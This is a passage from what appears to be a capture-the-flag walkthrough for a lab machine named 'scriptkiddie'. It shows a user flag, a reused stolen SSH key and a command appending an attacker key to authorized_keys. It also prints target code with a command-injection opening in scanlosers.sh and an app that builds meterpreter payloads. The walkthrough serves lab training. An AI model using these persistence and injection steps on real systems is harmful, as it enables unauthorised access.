</span></span><span class=line><span class=cl>drwxrwxr-x 2 kid kid 4.0K Feb  3 07:40 templates
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ pwd
</span></span><span class=line><span class=cl>/home/kid/html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ls -lhA ..
</span></span><span class=line><span class=cl>total 52K
</span></span><span class=line><span class=cl>lrwxrwxrwx 1 root kid    9 Jan  5 20:31 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- 1 kid  kid  220 Feb 25  2020 .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- 1 kid  kid 3.7K Feb 25  2020 .bashrc
</span></span><span class=line><span class=cl>drwxrwxr-x 3 kid  kid 4.0K Feb  3 07:40 .bundle
</span></span><span class=line><span class=cl>drwx------ 2 kid  kid 4.0K Feb  3 07:40 .cache
</span></span><span class=line><span class=cl>drwx------ 4 kid  kid 4.0K Feb  3 11:49 .gnupg
</span></span><span class=line><span class=cl>drwxrwxr-x 3 kid  kid 4.0K Feb  3 07:40 .local
</span></span><span class=line><span class=cl>drwxr-xr-x 9 kid  kid 4.0K Feb  3 07:40 .msf4
</span></span><span class=line><span class=cl>-rw-r--r-- 1 kid  kid  807 Feb 25  2020 .profile
</span></span><span class=line><span class=cl>drwx------ 2 kid  kid 4.0K Feb  3 07:40 .ssh
</span></span><span class=line><span class=cl>-rw-r--r-- 1 kid  kid    0 Jan  5 11:10 .sudo_as_admin_successful
</span></span><span class=line><span class=cl>drwxrwxr-x 5 kid  kid 4.0K Feb  3 11:03 html
</span></span><span class=line><span class=cl>drwxrwxrwx 2 kid  kid 4.0K Feb  3 07:40 logs
</span></span><span class=line><span class=cl>drwxr-xr-x 3 kid  kid 4.0K Feb  3 11:48 snap
</span></span><span class=line><span class=cl>-r-------- 1 kid  kid   33 Jan  5 20:45 user.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat ../user.txt # /home/kid/user.txt
</span></span><span class=line><span class=cl>4cbc*************************08a
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-kid-to-pwn>Privilege Escalation of Machine : from kid to pwn<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-kid-to-pwn>#</a></h2><p>Let&rsquo;s find if there is another user flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>kid@scriptkiddie:~$ find / -name user.txt -type f 2&gt;/dev/null
</span></span><span class=line><span class=cl>/home/kid/user.txt
</span></span></code></pre></td></tr></table></div></div><p>No there isn&rsquo;t. But we can loot kid&rsquo;s private key to have a better shell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ chmod 600 id_rsa_kid
</span></span><span class=line><span class=cl>$ ssh kid@10.129.77.135 -i id_rsa_kid
</span></span></code></pre></td></tr></table></div></div><p>Note: has been patched, there is no longer some ssh key but we can add ours:
<code>printf %s 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch' >> /home/kid/.ssh/authorized_keys</code>.</p><p>There is another user named <code>pwn</code> owning a script: <code>/home/pwn/scanlosers.sh</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>log</span><span class=o>=</span>/home/kid/logs/hackers
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>cd</span> /home/pwn/
</span></span><span class=line><span class=cl>cat <span class=nv>$log</span> <span class=p>|</span> cut -d<span class=s1>&#39; &#39;</span> -f3- <span class=p>|</span> sort -u <span class=p>|</span> <span class=k>while</span> <span class=nb>read</span> ip<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    sh -c <span class=s2>&#34;nmap --top-ports 10 -oN recon/</span><span class=si>${</span><span class=nv>ip</span><span class=si>}</span><span class=s2>.nmap </span><span class=si>${</span><span class=nv>ip</span><span class=si>}</span><span class=s2> 2&gt;&amp;1 &gt;/dev/null&#34;</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[[</span> <span class=k>$(</span>wc -l &lt; <span class=nv>$log</span><span class=k>)</span> -gt <span class=m>0</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span> <span class=nb>echo</span> -n &gt; <span class=nv>$log</span><span class=p>;</span> <span class=k>fi</span>
</span></span></code></pre></td></tr></table></div></div><p>We have write access to <code>/home/kid/logs/hackers</code>. We can see that our date and
IP is written to this file when we try to bypass the searchploit function:</p><p><code>/home/kid/html/app.py</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>datetime</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tempfile</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>request</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>werkzeug.utils</span> <span class=kn>import</span> <span class=n>secure_filename</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>regex_ip</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)</span><span class=si>{3}</span><span class=s1>(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>regex_alphanum</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;^[A-Za-z0-9 \.]+$&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>OS_2_EXT</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;windows&#39;</span><span class=p>:</span> <span class=s1>&#39;exe&#39;</span><span class=p>,</span> <span class=s1>&#39;linux&#39;</span><span class=p>:</span> <span class=s1>&#39;elf&#39;</span><span class=p>,</span> <span class=s1>&#39;android&#39;</span><span class=p>:</span> <span class=s1>&#39;apk&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;GET&#39;</span> <span class=ow>or</span> <span class=ow>not</span> <span class=s1>&#39;action&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;scan&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>scan</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;ip&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;generate&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>venom</span><span class=p>(</span><span class=n>request</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;searchsploit&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>searchsploit</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;search&#39;</span><span class=p>],</span> <span class=n>request</span><span class=o>.</span><span class=n>remote_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;no valid action&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>scan</span><span class=p>(</span><span class=n>ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>regex_ip</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=n>ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>ip</span> <span class=o>==</span> <span class=n>request</span><span class=o>.</span><span class=n>remote_addr</span> <span class=ow>and</span> <span class=n>ip</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;10.10.1&#39;</span><span class=p>)</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>ip</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;10.10.10.&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>stime</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span><span class=mi>400</span><span class=p>)</span><span class=o>/</span><span class=mi>100</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=n>stime</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;Starting Nmap 7.80 ( https://nmap.org ) at </span><span class=si>{</span><span class=n>datetime</span><span class=o>.</span><span class=n>datetime</span><span class=o>.</span><span class=n>utcnow</span><span class=p>()</span><span class=o>.</span><span class=n>strftime</span><span class=p>(</span><span class=s2>&#34;%Y-%m-</span><span class=si>%d</span><span class=s2> %H:%M&#34;</span><span class=p>)</span><span class=si>}</span><span class=s2> UTC</span><span class=se>\n</span><span class=s2>Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><span class=se>\n</span><span class=s2>Nmap done: 1 IP address (0 hosts up) scanned in </span><span class=si>{</span><span class=n>stime</span><span class=si>}</span><span class=s2> seconds&#34;&#34;&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>([</span><span class=s1>&#39;nmap&#39;</span><span class=p>,</span> <span class=s1>&#39;--top-ports&#39;</span><span class=p>,</span> <span class=s1>&#39;100&#39;</span><span class=p>,</span> <span class=n>ip</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>scan</span><span class=o>=</span><span class=n>result</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>,</span> <span class=s1>&#39;ignore&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>scanerror</span><span class=o>=</span><span class=s2>&#34;invalid ip&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>searchsploit</span><span class=p>(</span><span class=n>text</span><span class=p>,</span> <span class=n>srcip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>regex_alphanum</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>([</span><span class=s1>&#39;searchsploit&#39;</span><span class=p>,</span> <span class=s1>&#39;--color&#39;</span><span class=p>,</span> <span class=n>text</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>searchsploit</span><span class=o>=</span><span class=n>result</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>,</span> <span class=s1>&#39;ignore&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;/home/kid/logs/hackers&#39;</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[</span><span class=si>{</span><span class=n>datetime</span><span class=o>.</span><span class=n>datetime</span><span class=o>.</span><span class=n>now</span><span class=p>()</span><span class=si>}</span><span class=s1>] </span><span class=si>{</span><span class=n>srcip</span><span class=si>}</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>sserror</span><span class=o>=</span><span class=s2>&#34;stop hacking me - well hack you back&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>venom</span><span class=p>(</span><span class=n>request</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>errors</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>file</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=s1>&#39;lhost&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>errors</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;lhost missing&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>lhost</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;lhost&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>regex_ip</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=n>lhost</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>errors</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;invalid lhost ip&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=s1>&#39;os&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>errors</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;os missing&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tar_os</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>tar_os</span> <span class=ow>not</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;windows&#39;</span><span class=p>,</span> <span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=s1>&#39;android&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>errors</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;invalid os: </span><span class=si>{</span><span class=n>tar_os</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;template&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span> <span class=ow>and</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>[</span><span class=s1>&#39;template&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>filename</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>file</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>[</span><span class=s1>&#39;template&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=s1>&#39;.&#39;</span> <span class=ow>in</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span> <span class=ow>and</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=n>OS_2_EXT</span><span class=p>[</span><span class=n>tar_os</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>            <span class=n>errors</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>tar_os</span><span class=si>}</span><span class=s1> requires a </span><span class=si>{</span><span class=n>OS_2_EXT</span><span class=p>[</span><span class=n>tar_os</span><span class=p>]</span><span class=si>}</span><span class=s1> ext template file&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>template_name</span> <span class=o>=</span> <span class=n>secure_filename</span><span class=p>(</span><span class=n>file</span><span class=o>.</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>template_ext</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>template_file</span> <span class=o>=</span> <span class=n>tempfile</span><span class=o>.</span><span class=n>NamedTemporaryFile</span><span class=p>(</span><span class=s1>&#39;wb&#39;</span><span class=p>,</span> <span class=n>suffix</span><span class=o>=</span><span class=s1>&#39;.&#39;</span><span class=o>+</span><span class=n>template_ext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>file</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>template_file</span><span class=o>.</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>template_name</span> <span class=o>=</span> <span class=s2>&#34;None&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>errors</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>payloaderror</span><span class=o>=</span><span class=s1>&#39;&lt;br/&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>errors</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>tar_os</span><span class=si>}</span><span class=s1>/meterpreter/reverse_tcp&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>outfilename</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>remote_addr</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()[:</span><span class=mi>12</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;.&#39;</span> <span class=o>+</span> <span class=n>OS_2_EXT</span><span class=p>[</span><span class=n>tar_os</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>outfilepath</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>root_path</span><span class=p>,</span> <span class=s1>&#39;static&#39;</span><span class=p>,</span> <span class=s1>&#39;payloads&#39;</span><span class=p>,</span> <span class=n>outfilename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;msfvenom -x </span><span class=si>{</span><span class=n>template_file</span><span class=o>.</span><span class=n>name</span><span class=si>}</span><span class=s1> -p </span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=s1> LHOST=</span><span class=si>{</span><span class=n>lhost</span><span class=si>}</span><span class=s1> LPORT=4444&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>([</span><span class=s1>&#39;msfvenom&#39;</span><span class=p>,</span> <span class=s1>&#39;-x&#39;</span><span class=p>,</span> <span class=n>template_file</span><span class=o>.</span><span class=n>name</span><span class=p>,</span> <span class=s1>&#39;-p&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;LHOST=</span><span class=si>{</span><span class=n>lhost</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;LPORT=4444&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;-o&#39;</span><span class=p>,</span> <span class=n>outfilepath</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>template_file</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>([</span><span class=s1>&#39;msfvenom&#39;</span><span class=p>,</span> <span class=s1>&#39;-p&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=sa>f</span><span class=s1>&#39;LHOST=</span><span class=si>{</span><span class=n>lhost</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;LPORT=4444&#39;</span><span class=p>,</span> <span class=s1>&#39;-o&#39;</span><span class=p>,</span> <span class=n>outfilepath</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>CalledProcessError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>payloaderror</span><span class=o>=</span><span class=s2>&#34;Something went wrong&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=o>=</span><span class=n>payload</span><span class=p>,</span> <span class=n>lhost</span><span class=o>=</span><span class=n>lhost</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>lport</span><span class=o>=</span><span class=mi>4444</span><span class=p>,</span> <span class=n>template</span><span class=o>=</span><span class=n>template_name</span><span class=p>,</span> <span class=n>fn</span><span class=o>=</span><span class=n>outfilename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
